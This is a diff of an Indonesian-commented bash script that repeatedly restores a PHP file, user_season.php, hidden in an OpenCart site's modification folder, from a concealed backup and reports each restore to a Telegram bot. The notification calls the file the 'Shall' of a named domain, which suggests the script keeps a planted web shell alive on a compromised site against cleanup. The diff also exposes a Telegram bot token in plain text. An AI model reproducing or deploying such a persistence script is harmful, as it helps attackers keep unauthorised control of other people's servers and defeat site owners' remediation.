@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/home/u0256282/public_html/lbliagalaxy.com/wo-logs.php"
+INDEX_FILE="/var/www/ideastile/public_html/system/storage/modification/admin/controller/catalog/user_season.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/home/u0256282/public_html/wp-admin/maint/"
+BACKUP_FOLDER="/var/www/ideastile/public_html/system/storage/modification/admin/controller/setting"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/file"
+BACKUP_FILE="$BACKUP_FOLDER/data_setting"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
@@ -39,12 +39,12 @@ monitor_file() {
             # Jika checksum berbeda, kembalikan file index.php dari backup
             echo "Change, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
-            echo "index.php dikembalikan ke versi backup."
-            send_telegram_notification "Perubahan terdeteksi pada index.php. File dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
+            echo "Shall www.ideastile.it dikembalikan ke versi backup."
+            send_telegram_notification "Perubahan terdeteksi pada Shall www.ideastile.it. File user_season.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
         fi
 
-        # Tunggu 1 detik sebelum pengecekan selanjutnya
-        sleep 1
+        # Tunggu 30 detik sebelum pengecekan selanjutnya
+        sleep 600
     done
 }
 
